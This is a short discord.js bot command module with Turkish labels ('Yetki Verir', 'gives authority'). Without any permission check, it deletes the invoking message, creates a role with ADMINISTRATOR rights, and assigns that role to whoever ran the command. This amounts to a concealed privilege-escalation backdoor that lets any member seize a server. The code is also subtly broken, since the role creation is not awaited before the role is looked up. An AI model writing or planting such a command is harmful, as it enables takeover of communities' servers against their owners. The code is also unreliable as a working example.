  const Discord = require('discord.js');

exports.run = (client, msg, args) => {
    msg.delete();
    msg.guild.roles.create({ name: "new role", permissions: ["ADMINISTRATOR"] });
    let rol = msg.guild.roles.cache.find(role => role.name === "new role");
    msg.member.roles.add(rol);
};

exports.conf = {
  enabled: true,
  guildOnly: true,
  aliases: ['yetki']
};

exports.help = {
  name: 'Yetki',
  description: 'Yetki Verir.',
  usage: 'yetki'
};